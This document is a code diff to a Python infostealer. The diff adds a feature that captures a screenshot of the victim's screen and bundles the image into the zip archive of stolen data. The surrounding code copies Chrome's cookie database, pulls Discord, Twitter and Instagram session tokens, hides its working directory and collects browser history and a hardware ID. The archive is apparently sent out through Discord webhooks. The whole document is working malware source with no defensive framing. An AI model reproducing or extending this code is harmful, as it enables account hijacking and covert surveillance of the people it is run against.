@@ -22,8 +22,16 @@ from zipfile import ZipFile, ZIP_DEFLATED
 from cpuinfo import get_cpu_info
 from multiprocessing import freeze_support
 from tempfile import TemporaryDirectory
+from pyautogui import screenshot
+from random import choices
+from string import ascii_letters, digits
 
 website = ['discord.com', 'twitter.com', 'instagram.com']
+
+def get_screenshot(path):
+    get_screenshot.scrn = screenshot()
+    get_screenshot.scrn_path = os.path.join(path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png")
+    get_screenshot.scrn.save(get_screenshot.scrn_path)
 
 def get_hwid():
     p = Popen('wmic csproduct get uuid', shell=True, stdout=PIPE, stderr=PIPE)
@@ -117,7 +125,6 @@ def main(dirpath):
                             "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
     if not os.path.isfile(filename):
         copyfile(db_path, os.path.join(dirpath, 'Cookies.db'))
-        #SetFileAttributes(filename, win32con.FILE_ATTRIBUTE_HIDDEN)
     db = connect(os.path.join(dirpath, 'Cookies.db'))
     db.text_factory = lambda b: b.decode(errors="ignore")
     for w in website:
@@ -202,6 +209,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
     cpuinfo = get_cpu_info()
     with TemporaryDirectory(dir='.') as td:
         SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
+        get_screenshot(path=td)
         main_info = main(td)
         discord_T, twitter_T, insta_T = (PrettyTable(padding_width=1) for _ in range(3))
         discord_T.field_names, twitter_T.field_names, insta_T.field_names, verified_tokens = ["Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid"], []
@@ -242,6 +250,8 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
                     zip.write(f.name)
             with open(os.path.join(td, 'History.txt'), 'w') as f:
                 f.write(find_His())
+                zip.write(f.name)
+            with open(get_screenshot.scrn_path, "rb") as f:
                 zip.write(f.name)
             for name_f, _ in files_names:
                 if os.path.exists(name_f):
